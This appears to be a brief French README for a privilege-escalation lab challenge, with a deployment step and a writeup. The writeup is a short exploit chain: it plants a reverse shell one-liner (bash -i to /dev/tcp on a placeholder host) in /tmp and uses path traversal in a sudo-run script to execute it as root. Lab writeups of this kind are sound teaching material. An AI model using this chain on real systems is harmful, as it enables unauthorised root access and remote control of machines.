# Privesc n°2

## Déploiement

```bash
sudo bash build.sh
```

## Writeup

```bash
mkdir /tmp/aa-deployment/
nano /tmp/aa-deployment/run.sh # bash -c 'bash -i >& /dev/tcp/X.X.X.X/XXXX 0>&1'
sudo /bin/bash /opt/app/script.sh '../../../../tmp/aa'
```